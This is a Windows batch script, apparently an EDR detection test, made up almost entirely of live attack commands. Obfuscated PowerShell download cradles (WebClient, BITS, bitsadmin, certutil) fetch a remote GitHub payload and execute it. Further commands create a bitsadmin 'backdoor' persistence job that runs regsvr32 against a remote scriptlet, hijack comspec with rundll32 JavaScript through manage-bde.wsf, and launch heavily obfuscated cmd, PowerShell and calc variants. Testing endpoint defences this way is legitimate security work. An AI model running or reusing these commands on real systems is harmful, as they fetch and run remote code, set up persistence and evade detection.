echo %time% %date% [+] Testing DISK\PSWEBFILE exec
start "" cmd /c powershell -c "SI Variable:\9 'Net.WebClient';SV iH 'Default_File_Path.ps1';Set-Item Variable:gE 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';sl;SI Variable:/g (.(Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name).(((Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name)|Member|Where-Object{(Variable _ -ValueO).Name-like'G*ts'}).Name).Invoke('Ne*ct')(Variable 9).Value);SI Variable:h20 ((((Get-Item Variable:/g).Value|Member)|Where-Object{(Variable _ -ValueO).Name-like'Do*o*d*le'}).Name);(Get-Item Variable:/g).Value.((GV h20).Value).Invoke((GCI Variable:\gE).Value,(Variable iH -Val));(Variable *uti*t).Value.(((Variable *uti*t).Value|Member)[6].Name).InvokeScript((-Join([Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes((Variable iH -Val))))))"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing DISK\PSBITS exec
start "" cmd /c powershell -c "Set-Variable pD5 'Default_File_Path.ps1';SI Variable:YD2 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=Help(Get-Command *ar*Bi*s*);.(Get-Command *ar*Bi*s*)-So (Get-Variable YD2 -ValueOn) -Destina (DIR Variable:/pD5).Value;$ExecutionContext|ForEach{(Get-ChildItem Variable:_).Value.(($ExecutionContext|GM)[6].Name)|ForEach{(Get-Item Variable:/_).Value.InvokeScript((([Char[]](GC -En 3 (DIR Variable:/pD5).Value))-Join''))}}"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing DISK\BITSADMIN exec
start "" cmd /c powershell -c "Set-Item Variable:\PL2 'Default_File_Path.ps1';SV 69x 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=bitsadmin /transfer /ybBUL (LS Variable:69x).Value (GV PL2).Value;([String]::Join('',((GC -Encodin 3 (GV PL2).Value)|ForEach{[Char](GI Variable:_).Value})))|IEX"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing DISK\CERTUTIL exec
start "" cmd /c powershell -c "Set-Variable T2Z 'Default_File_Path.ps1';SV kz1 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';$NULL=C:\Windows\System32\certutil -urlcache /f (Get-Variable kz1).Value (Get-Variable T2Z -ValueOn);&(Get-Alias *EX)(([System.String]::Join('',([Text.Encoding]::ASCII.GetString([System.IO.File]::ReadAllBytes((Get-Variable T2Z -ValueOn)))))))"
echo Execution Finished at %time% %date%
timeout 5

REM ---- EOF Invoke-CradleCrafter Payloads ----

echo **********************************************
echo *        Testing Variations                  *
echo **********************************************

echo %time% %date% [+] Testing bitsadmin persistance via regsvr32 exec
REM taken from https://github.com/3gstudent/bitsadminexec
start "" cmd /c bitsadmin /create backdoor
start "" cmd /c bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
start "" cmd /c bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
start "" cmd /c bitsadmin /Resume backdoor
start "" cmd /c bitsadmin /Cancel backdoor
echo Execution Finished at %time% %date%
echo Command Excuted: bitsadmin /create backdoor
echo Command Excuted: bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
echo Command Excuted: bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct scrobj.dll"
echo Command Excuted: bitsadmin /Resume backdoor
echo Command Excuted: bitsadmin /Cancel backdoor

timeout 5

echo %time% %date% [+] Testing manage-bde.wsf with rundll32 JS exec
set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
start "" cscript C:\windows\system32\manage-bde.wsf
set comspec=C:\WINDOWS\system32\cmd.exe
echo Execution Finished at %time% %date%
echo Command Excuted: set comspec=rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test")
echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf
echo Command Excuted: set comspec=C:\WINDOWS\system32\cmd.exe
timeout 5


:: Generate like this: Invoke-DOSfuscation -Command 'calc.exe' -CliCommand 'Binary\Cmd\2' -Quiet
echo %time% %date% [+] Testing BINARY\CMD\1 exec
start "" %PUBLIC:~-1%m%TMP:~-15,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\CMD\2 exec
start "" FOR /F "tokens=2 delims==Yf" %L IN ('assoc.cmd')DO %L
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\CMD\3 exec
start "" ^F^o^r  ;   ,  ,  ,  ;   /^F  ,   ,  ;  ,  "   delims=nGfMK       tokens=    1    "    ,   ,    ;   ,   ,   %Y   ,    ,  ;   ,   ^in    ;  ;   ,  ;   (  ,   ;  ,  ,   '   ;    ;   ,   ^^FtY^^P^^e  ,  ;   ;   ;  ,   ^|   ;  ;   ;  ;   ;    ^^F^^in^^D  ;    ,  ,  "mdfi"  ;  ;    ,  ,  '   ;   ;   ,   )  ;  ,  ,  ,  ,   ,  ;  ^D^O  ;    ;  ;   ,   ,    %Y
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\PS\1 exec
start "" %PUBLIC:~-6,-5%%ProgramData:~-9,-8%%SystemRoot:~3,-6%%ProgramFiles:~14,1%rsh%CommonProgramW6432:~-2,-1%l%TMP:~-10,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\PS\2 exec
start "" FOR /F "tokens=9 delims=L.\Dg" %J IN ('ftype^|findstr v1.')DO %J
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing BINARY\PS\3 exec
^F^o^R   ;  ,    ;   ;  ;  ;   ;  /^F    ;   ,  ,  ,  ,   "    tokens=   3    delims=mC."    ,  ,   ;    ,  ,   %6  ;  ,  ;   ,   ,  ;  ^IN   ,  ,   ,  ,  ;   ,  ,   (   ;  ;    ;  ,   ;    '   ;    ;   ;   ,   ;  ,   ;    ^^a^^s^^S^^O^^c   ;  ,    ,  ,    ,  ;  .cdxml     '  ,  ,  ;   ,  ;   )   ,  ;   ,  ^d^O    ,  ;  ,    %6
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing ENCODING\1 exec
start "" ca%ProgramFiles:~13,1%c.%TMP:~-3,-2%x%CommonProgramFiles:~-2,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing ENCODING\2 exec
start "" ca%LOCALAPPDATA:~-1,1%%PUBLIC:~-1%.%TMP:~5,1%x%CommonProgramFiles(x86):~-21,1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing ENCODING\3 exec
start "" ca%COmmOnprogRAMW6432:~   -3,     1%%tmP:~    -8,   1%.%TMP:~    -3,   -2%x%PrOGRAMFIleS(X86):~    -8,      1%
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\CONCAT\1 exec
start "" cmd /C"set Gs=calc&&set 9Uv=.exe&&call set 8pW=%Gs%%9Uv%&&call %8pW%"
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\CONCAT\2 exec
start "" ^c%ComMonprogrAMfIlEs:~ 20,-8%^D,  ,  , , /%CommONPRogRAMW6432:~  -12, +1%" , (^S^Et oA^t^p=^xe)& ( ,(sE^t ^ ^ CKl^w=c^alc.e),  )&  , cAlL , , ^Se^t   Pw=%CKl^w%%oA^t^p%&& , , ( (cA^ll , %P^w%), )  "
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\CONCAT\3 exec
^FOr;/^f,"  delims=0MHFNZ  tokens= +2  " ,%^y , ^IN,; ( ,; ' ; ft^^yp^^E ,, ^| , ^^FiN^^D^^ST^^r ,S^^H^^Cm' , , ) ; ; d^O ,%^y; ; YPd7aN ,TZ2azt/%coMMonPROGRaMW6432:~17,  -11%",( (S^eT ^]$=^.) )&&  ( , (sE^t @^*$^_=^e) , , )&  (  ,(^s^E^T ^ ^ ~^?^-=^x) )&& (, (s^Et ^ ^ ^#^?_=a^l) ; )&  (^SET ^,;^-=e)&(^SeT ^  ^}^[@=^c)&&(S^Et ^ ^~^\+^'=^c)&, , ^C^A^l^l ;^S^e^t .'$_=%^~^\+^'%%^#^?_%%^}^[@%%^]$%%@^*$^_%%~^?^-%%^,;^-%&; ;( ,  , ,  , ,  (C^A^LL ;%.'^$^_%)  , )  "
echo Execution Finished at %time% %date%
timeout 5

echo %time% %date% [+] Testing PAYLOAD\REVERSE\1 exec
start "" cmd /V:ON/C"set bRm=exe.clac&&for /L %v in (7;-1;0)do set nT=!nT!!bRm:~%v,1!&&if %v==0 call %nT:~4%"
echo Execution Finished at %time% %date%
timeout 5
echo %time% %date% [+] Testing PAYLOAD\REVERSE\2 exec
start "" %comMoNproGraMW6432:~ 17,+1%^m%Os:~   3,  -6%;   ; ^/V:^o  ;  ; /R " ;; (^SE^t ^ ^ ^ T4=k^TU^e^AG^0xcw^m^eK^s8^.G^Q^d^ce^R^Xl^7d^u^aYOoc)&&;  ^fOr  ; ;  /^L ;  %^w  ;  ; ^IN ;  ;; ( ^ 31  ;^ ^;^ -4^ 3^ ^ ) ; D^O ;  ; ;  (  (;  ;^sET    5^u=!5^u!!T4:~%^w,  1!) )& ;  ; ^i^F; ; %^w ;  ; ^Equ; ;^3 ;; (   (^C^aL^L ;  ; %5^u:^*^5u^!=%   ) ; ; )   "
echo Execution Finished at %time% %date%
timeout 5